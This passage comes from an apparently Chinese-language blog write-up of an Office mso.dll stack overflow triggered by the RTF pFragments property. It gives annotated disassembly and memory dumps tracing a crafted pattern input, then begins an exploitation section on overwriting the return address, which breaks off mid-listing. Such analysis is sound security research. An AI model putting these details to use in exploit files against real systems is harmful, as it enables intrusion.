class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>319C0631 loc_319C0631:                           <span class="comment">; CODE XREF: sub_31FD724E-616C6D↑j</span></span><br><span class="line"><span class="symbol">.text:</span>319C0631                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+el_count]                  <span class="comment">;   eax = ebp-0x4 = 0x0011B268-0x4 = 0x0011B264</span></span><br><span class="line"><span class="symbol">.text:</span>319C0634                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; ppstm              ; arg3: eax = 0x0011B264</span></span><br><span class="line"><span class="symbol">.text:</span>319C0635                 <span class="keyword">push</span>    <span class="number">1</span>               <span class="comment">; fDeleteOnRelease   ; arg2: 1</span></span><br><span class="line"><span class="symbol">.text:</span>319C0637                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+pMem]      <span class="comment">; pMem               ; arg1: [ebp-0x1c] = [0x0011B268-0x1c] = [0x0011B24c] = 0x0026FAD8</span></span><br><span class="line">            <span class="comment">; 0026FAD8  11 11 11 11 AC C8 41 61 30 41 61 31 41 61 32 41  Aa0Aa1Aa2A</span></span><br><span class="line">            <span class="comment">; 0026FAE8  61 33 41 61 34 41 61 35 41 61 36 41 61 37 41 61  a3Aa4Aa5Aa6Aa7Aa</span></span><br><span class="line">            <span class="comment">; 0026FAF8  38 41 61 39 41 62 30 41 62 31 41 62 32 41 62 33  8Aa9Ab0Ab1Ab2Ab3</span></span><br><span class="line">            <span class="comment">; 0026FB08  41 62 34 41 62 35 41 62 36 41 62 37 41 62 38 41  Ab4Ab5Ab6Ab7Ab8A</span></span><br><span class="line">            <span class="comment">; 0026FB18  62 39 41 63 30 41 63 31 41 63 32 41 63 33 41 63  b9Ac0Ac1Ac2Ac3Ac</span></span><br><span class="line">            <span class="comment">; 0026FB28  34 41 63 35 41 63 36 41 63 37 41 63 38 41 63 39  4Ac5Ac6Ac7Ac8Ac9</span></span><br><span class="line">            <span class="comment">; 0026FB38  41 64 30 41 64 31 41 64 32 41 64 33 41 64 34 41  Ad0Ad1Ad2Ad3Ad4A</span></span><br><span class="line">            <span class="comment">; 0026FB48  64 35 41 64 36 41 64 37 41 64 38 41 64 39 41 65  d5Ad6Ad7Ad8Ad9Ae</span></span><br><span class="line">            <span class="comment">; 0026FB58  30 41 65 31 41 65 32 41 65 33 41 65 34 41 65 35  0Ae1Ae2Ae3Ae4Ae5</span></span><br><span class="line">            <span class="comment">; 0026FB68  41 65 36 41 65 37 41 65 38 41 65 39 41 66 30 41  Ae6Ae7Ae8Ae9Af0A</span></span><br><span class="line">            <span class="comment">; 0026FB78  66 31 41 66 32 41 66 33 41 66 34 41 66 35 41 66  f1Af2Af3Af4Af5Af</span></span><br><span class="line">            <span class="comment">; 0026FB88  36 41 66 37 41 66 38 41 66 39 41 67 30 41 67 31  6Af7Af8Af9Ag0Ag1</span></span><br><span class="line"><span class="symbol">.text:</span>319C063A                 <span class="keyword">call</span>    <span class="built_in">ds</span>:GlobalHandle                      <span class="comment">; GlobalHandle函数与GlobalLock函数作用相反</span></span><br><span class="line"><span class="symbol">.text:</span>319C0640                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; hGlobal            ; arg1: eax = 0x0026FAD8</span></span><br><span class="line"><span class="symbol">.text:</span>319C0641                 <span class="keyword">call</span>    <span class="built_in">ds</span>:CreateStreamOnHGlobal             <span class="comment">; CreateStreamOnHGlobal函数从指定内存创建流对象</span></span><br><span class="line"><span class="symbol">.text:</span>319C0647                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]                     <span class="comment">;   eax = [ebp-0x8] = [0x0011B268-0x8] = [0x0011B260] = 0x066A55E0(关键对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>319C064A                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+el_count]                       <span class="comment">; arg2: [ebp-0x4] = [0x0011B268-0x4] = [0x0011B264] = 0x06454B30(对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>319C064D                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]                           <span class="comment">;   ecx = [eax] = [0x066A55E0] = 0x32A0C8C4(虚表指针)</span></span><br><span class="line"><span class="symbol">.text:</span>319C064F                 <span class="keyword">push</span>    <span class="built_in">eax</span>                                  <span class="comment">; arg1: eax = 0x066A55E0(关键对象首地址)</span></span><br><span class="line"><span class="symbol">.text:</span>319C0650                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">38h</span>]                  <span class="comment">; mso.32E14136</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line">    *********************************************************</span><br><span class="line"></span><br><span class="line">        所属模块: mso.dll</span><br><span class="line">        signed <span class="keyword">int</span> __stdcall sub_32E14136(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span><br><span class="line"></span><br><span class="line">    *********************************************************</span><br><span class="line"><span class="symbol">    .text:</span>32E14136                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">;   ebp = 0x0011B268</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14137                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                         <span class="comment">;   ebp = esp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14139                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                              <span class="comment">;   ecx = 0x32A0C8C4(虚表指针)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1413A                 <span class="keyword">push</span>    <span class="built_in">ecx</span>                              <span class="comment">;   ecx = 0x32A0C8C4(虚表指针)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1413B                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">;   ebx = 0x02340000</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1413C                 <span class="keyword">mov</span>     <span class="built_in">ebx</span>, [<span class="built_in">ebp</span>+arg_4]                 <span class="comment">;   ebx = [ebp+0xc] = [0x0011B1F4] = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1413F                 <span class="keyword">push</span>    <span class="built_in">esi</span>                              <span class="comment">;   esi = 0x023A0004, (ASCII "11111111acc84161304161314161324161334161344161354161364161374161384161394162304162314162324162334162")</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14140                 <span class="keyword">push</span>    <span class="built_in">edi</span>                              <span class="comment">;   edi = 0x00020026(pFragments属性值字节数，"11111111acc8....feff61&#125;&#125;&#125;"不算括号)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14141                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_4]                 <span class="comment">;   eax = ebp+0xc = 0x0011B1F4(a2地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14144                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg2: eax = 0x0011B1F4(a2地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14145                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">; arg1: ebx = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14146                 <span class="keyword">call</span>    sub_33287CC1                     <span class="comment">; [0x0011B1F4] = 0x06454B30 -&gt; 0x06451111 &lt;-----</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1414B                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1414D                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1414F                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_4]                 <span class="comment">;   eax = ebp-0x4 = 0x0011B1E4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14152                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg2: eax = 0x0011B1E4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14153                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">; arg1: ebx = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14154                 <span class="keyword">call</span>    sub_33287CC1                     <span class="comment">; [0x0011B1E4] = 0x32A0C8C4 -&gt; 0x32A01111 &lt;-----</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14159                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1415B                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1415D                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]                 <span class="comment">;   eax = ebp-8 = 0x0011B1E0</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14160                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg2: eax = 0x0011B1E0</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14161                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">; arg1: ebx = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14162                 <span class="keyword">call</span>    sub_33287CC1                     <span class="comment">; [0x0011B1E0] = 0x32A0C8C4 -&gt; 0x32A0C8AC &lt;-----</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14167                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14169                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1416B                 <span class="keyword">mov</span>     <span class="built_in">ax</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_4]         <span class="comment">;   ax = [ebp+0xc] = [0x0011B1F4] = 0x1111</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1416F                 <span class="keyword">cmp</span>     <span class="built_in">ax</span>, [<span class="built_in">ebp</span>+var_4]                  <span class="comment">;   ax = 0x1111,[ebp-0x4] = [0x0011B1E4] = 0x1111 &lt;-----两个word进行比较</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14173                 <span class="keyword">ja</span>      short loc_32E141C5               <span class="comment">;   大于则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14175                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_0]                 <span class="comment">;   esi = [ebp+0x8] = [0x0011B1F0] = 0x066A55E0(关键对象首地址)(a1)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14178                 <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">10h</span>]              <span class="comment">; arg1: [esi+0x10] = [0x066A55E0+0x10] = [0x066A55F0] = 0x066A5618</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1417B                 <span class="keyword">call</span>    _MsoFreePv@<span class="number">4</span>    <span class="comment">; MsoFreePv(x)   ; </span></span><br><span class="line"><span class="symbol">    .text:</span>32E14180                 <span class="keyword">mov</span>     <span class="built_in">ax</span>, [<span class="built_in">ebp</span>+var_8]                  <span class="comment">;   ax = [ebp-0x8] = [0x0011B1E8-0x8] = [0x0011B1E0] = 0xC8AC(复制数据长度)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14184                 <span class="keyword">mov</span>     [<span class="built_in">esi</span>+<span class="number">0Ch</span>], <span class="built_in">ax</span>                    <span class="comment">;   [esi+0xc] = [0x066A55E0+0xc] = [0x066A55EC] = ax = 0xC8AC(复制数据长度) &lt;---- 对关键对象成员变量赋值</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14188                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_4]                 <span class="comment">;   eax = [ebp-0x4] = [0x0011B1E4] = 0x00001111</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1418C                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg3: eax = 0x00001111</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1418D                 <span class="keyword">push</span>    <span class="number">4</span>                                <span class="comment">; arg2: 0x4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1418F                 <span class="keyword">lea</span>     <span class="built_in">edi</span>, [<span class="built_in">esi</span>+<span class="number">4</span>]                     <span class="comment">;   edi = esi+4 = 0x066A55E0+4 = 0x066A55E4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14192                 <span class="keyword">push</span>    <span class="built_in">edi</span>                              <span class="comment">; arg1: edi = 0x066A55E4</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14193                 <span class="keyword">call</span>    MSO_501                          <span class="comment">; 对关键对象0x066A55E0中的成员变量赋值</span></span><br><span class="line"><span class="symbol">    .text:</span>32E14198                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x1</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1419A                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0则跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">    .text:</span>32E1419C                 <span class="keyword">movzx</span>   <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_8]                 <span class="comment">;   eax = [0x0011B1E8-0x8] = [0x0011B1E0] = 0x0000C8AC</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141A0                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+arg_4]        <span class="comment">;   ecx = [ebp+0xc] = [0x0011B1F4] = 0x00001111</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141A4                 <span class="keyword">imul</span>    <span class="built_in">eax</span>, <span class="built_in">ecx</span>                         <span class="comment">;   eax = eax*ecx = 0x0D60BF6C</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141A7                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg3: eax = 0x0D60BF6C</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141A8                 <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">10h</span>]              <span class="comment">; arg2: [esi+0x10] = [0x066A55E0+0x10] = [0x066A55F0] = 0x1D400000</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141AB                 <span class="keyword">push</span>    <span class="built_in">ebx</span>                              <span class="comment">; arg1: ebx = 0x06454B30(a2)(对象首地址)</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141AC                 <span class="keyword">call</span>    sub_3277BE91                     <span class="comment">; </span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line">        ******************************************************************</span><br><span class="line"></span><br><span class="line">            所属模块: mso.dll</span><br><span class="line">            signed <span class="keyword">int</span> __stdcall sub_3277BE91(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span><br><span class="line"></span><br><span class="line">        ******************************************************************</span><br><span class="line"><span class="symbol">        .text:</span>3277BE91                 <span class="keyword">push</span>    <span class="built_in">ebp</span>                              <span class="comment">;   ebp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE92                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span>                         <span class="comment">;   ebp = esp = 0x0011B1C0</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE94                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+arg_0]                 <span class="comment">;   eax = [ebp+8] = [0x0011B1C0+8] = [0x0011B1C8] = 0x06454B30(a1)(对象首地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE97                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>]                       <span class="comment">;   ecx = [eax] = [0x06454B30] = 0x72580D38(ole32.dll中的虚表指针)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE99                 <span class="keyword">push</span>    <span class="built_in">esi</span>                              <span class="comment">;   esi = 0x066A55E0(关键对象首地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE9A                 <span class="keyword">mov</span>     <span class="built_in">esi</span>, [<span class="built_in">ebp</span>+arg_8]                 <span class="comment">;   esi = [ebp+0x10] = [0x0011B1C0+0x10] = [0x0011B1D0] = 0x0D60BF6C(a3)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BE9D                 <span class="keyword">lea</span>     <span class="built_in">edx</span>, [<span class="built_in">ebp</span>+arg_0]                 <span class="comment">;   edx = ebp+0x8 = 0x0011B1C0+0x8 = 0x0011B1C8(a1地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA0                 <span class="keyword">push</span>    <span class="built_in">edx</span>                              <span class="comment">; arg4: edx = 0x0011B1C8(a1地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA1                 <span class="keyword">push</span>    <span class="built_in">esi</span>                              <span class="comment">; arg3: esi = 0x0D60BF6C(a3)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA2                 <span class="keyword">push</span>    [<span class="built_in">ebp</span>+arg_4]                      <span class="comment">; arg2: [ebp+0xC] = [0x0011B1C0+0xC] = [0x0011B1CC] = 0x1D400000(a2)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA5                 <span class="keyword">push</span>    <span class="built_in">eax</span>                              <span class="comment">; arg1: eax = 0x06454B30(a1)(对象首地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA6                 <span class="keyword">call</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">0Ch</span>]              <span class="comment">; ole32.72561D9A,CMemStm::Read(void *,ulong,ulong *)</span></span><br><span class="line">                <span class="comment">; 1D400000  41 61 30 41 61 31 41 61 32 41 61 33 41 61 34 41  Aa0Aa1Aa2Aa3Aa4A</span></span><br><span class="line">                <span class="comment">; 1D400010  61 35 41 61 36 41 61 37 41 61 38 41 61 39 41 62  a5Aa6Aa7Aa8Aa9Ab</span></span><br><span class="line">                <span class="comment">; 1D400020  30 41 62 31 41 62 32 41 62 33 41 62 34 41 62 35  0Ab1Ab2Ab3Ab4Ab5</span></span><br><span class="line">                <span class="comment">; 1D400030  41 62 36 41 62 37 41 62 38 41 62 39 41 63 30 41  Ab6Ab7Ab8Ab9Ac0A</span></span><br><span class="line">                <span class="comment">; 1D400040  63 31 41 63 32 41 63 33 41 63 34 41 63 35 41 63  c1Ac2Ac3Ac4Ac5Ac</span></span><br><span class="line">                <span class="comment">; 1D400050  36 41 63 37 41 63 38 41 63 39 41 64 30 41 64 31  6Ac7Ac8Ac9Ad0Ad1</span></span><br><span class="line">                <span class="comment">; 1D400060  41 64 32 41 64 33 41 64 34 41 64 35 41 64 36 41  Ad2Ad3Ad4Ad5Ad6A</span></span><br><span class="line">                <span class="comment">; 1D400070  64 37 41 64 38 41 64 39 41 65 30 41 65 31 41 65  d7Ad8Ad9Ae0Ae1Ae</span></span><br><span class="line">                <span class="comment">; 1D400080  32 41 65 33 41 65 34 41 65 35 41 65 36 41 65 37  2Ae3Ae4Ae5Ae6Ae7</span></span><br><span class="line">                <span class="comment">; 1D400090  41 65 38 41 65 39 41 66 30 41 66 31 41 66 32 41  Ae8Ae9Af0Af1Af2A</span></span><br><span class="line">                <span class="comment">; 1D4000A0  66 33 41 66 34 41 66 35 41 66 36 41 66 37 41 66  f3Af4Af5Af6Af7Af</span></span><br><span class="line">                <span class="comment">; 1D4000B0  38 41 66 39 41 67 30 41 67 31 41 67 32 41 67 33  8Af9Ag0Ag1Ag2Ag3</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEA9                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEAB                 <span class="keyword">jl</span>      loc_32CE0534                     <span class="comment">;   小于跳转，这里不跳转</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEB1                 <span class="keyword">cmp</span>     [<span class="built_in">ebp</span>+arg_0], <span class="built_in">esi</span>                 <span class="comment">;   [ebp+0x8] = [0x0011B1C0+0x8] = [0x0011B1C8] = 0x0001000D,esi = 0x0D60BF6C(a3)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEB4                 <span class="keyword">jnz</span>     loc_32CE053B                     <span class="comment">;   不为0跳转，这里跳转</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">        .text:</span>32CE053B loc_32CE053B:                           </span><br><span class="line"><span class="symbol">        .text:</span>32CE053B                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0</span></span><br><span class="line"><span class="symbol">        .text:</span>32CE053D                 <span class="keyword">jmp</span>     loc_3277BEBD                     <span class="comment">;</span></span><br><span class="line">            |       |</span><br><span class="line">            ↓       ↓</span><br><span class="line"><span class="symbol">        .text:</span>3277BEBD loc_3277BEBD:                           </span><br><span class="line"><span class="symbol">        .text:</span>3277BEBD                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                              <span class="comment">;   esi = 0x066A55E0(关键对象首地址)</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEBE                 <span class="keyword">pop</span>     <span class="built_in">ebp</span>                              <span class="comment">;   ebp = 0x0011B1E8</span></span><br><span class="line"><span class="symbol">        .text:</span>3277BEBF                 <span class="keyword">retn</span>    <span class="number">0Ch</span>                              <span class="comment">;</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>32E141B1                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141B3                 <span class="keyword">jz</span>      short loc_32E141C5               <span class="comment">;   为0跳转，这里跳转</span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>32E141C5 loc_32E141C5:                       </span><br><span class="line"><span class="symbol">    .text:</span>32E141C5                                    </span><br><span class="line"><span class="symbol">    .text:</span>32E141C5                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>                         <span class="comment">;   eax = 0x0</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141C7                 <span class="keyword">jmp</span>     short loc_32E141BE               <span class="comment">; </span></span><br><span class="line">        |       |</span><br><span class="line">        ↓       ↓</span><br><span class="line"><span class="symbol">    .text:</span>32E141BE loc_32E141BE:                           </span><br><span class="line"><span class="symbol">    .text:</span>32E141BE                 <span class="keyword">pop</span>     <span class="built_in">edi</span>                              <span class="comment">;   edi = 0x00020026</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141BF                 <span class="keyword">pop</span>     <span class="built_in">esi</span>                              <span class="comment">;   esi = 0x023A0004, (ASCII "11111111acc84161304161314161324161334161344161354161364161374161384161394162304162314162324162334162")</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141C0                 <span class="keyword">pop</span>     <span class="built_in">ebx</span>                              <span class="comment">;   ebx = 0x02340000</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141C1                 <span class="keyword">leave</span></span><br><span class="line"><span class="symbol">    .text:</span>32E141C2                 <span class="keyword">retn</span>    <span class="number">8</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;经过详细分析，我们可以看到，在<code>sub_32E14136</code>函数中三次调用<code>sub_33287CC1</code>函数，将<code>“1111”</code>、<code>“1111”</code>、<code>“C8AC”</code>分别解析出来，并对<code>先解析出来的“1111”</code>和<code>后解析出来的“1111”</code>进行比较，如果先解析出来的“1111”<code>大于</code>后解析出来的“1111”，则<code>退出</code>，不在执行后面的处理。这样看来，<code>“11111111”</code>中的<code>前4个字节</code>以<code>小端序</code>解析出来的数应该小于<code>后4个字节</code>以<code>小端序</code>解析出来的数，经过测试，<code>“11112222”</code>也是可行的。还有，在地址<code>0x32E14184</code>处的指令，将<code>复制数据长度0xC8AC</code>复制给了<code>关键对象0x066A55E0</code>的成员变量。</p><h2 id="0x40-漏洞利用"><a href="#0x40-漏洞利用" class="headerlink" title="0x40 漏洞利用"></a>0x40 漏洞利用</h2><h3 id="0x41-方法一：覆盖返回地址"><a href="#0x41-方法一：覆盖返回地址" class="headerlink" title="0x41 方法一：覆盖返回地址"></a>0x41 方法一：覆盖返回地址</h3><p><strong><code>环境：</code></strong>XP &amp; Office2003</p><p>&emsp;&emsp;触发异常的指令<code>“30ED442C rep movsd”</code>位于<code>sub_30ED4406</code>函数中，<code>“rep movsd”</code>指令复制内存数据时的<code>目的地址</code>，是通过<code>sub_30ED4406</code>函数的<code>第二个参数</code>传进来的，它其实是<code>sub_30ED4406</code>函数的<code>父函数sub_30F0B5C2</code>中定义的一个<code>局部变量</code>，所以<code>pFragements属性值数据</code>在<code>栈上的起始地址</code>位于父函数<code>sub_30F0B5C2</code>的<code>栈帧</code>中，我们要覆盖的也是父函数<code>sub_30F0B5C2</code>的<code>返回地址</code>。</p><p>&emsp;&emsp;根据<code>前面的分析</code>我们可以知道，当执行到指令<code>“30ED442C rep movsd”</code>处时，<code>栈布局</code>是这样的：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>30ED442C F3 A5        <span class="keyword">rep</span> <span class="keyword">movsd</span>   <span class="comment">; rep movs dword ptr es:[edi],dword ptr [esi]</span></span><br><span class="line">                                    栈数据：</span><br><span class="line">                                    001237B4   01C40824 &lt;-<span class="built_in">esp</span></span><br><span class="line">                                    001237B8   001239A4</span><br><span class="line">                                    001237BC   30F0B5FB  返回到 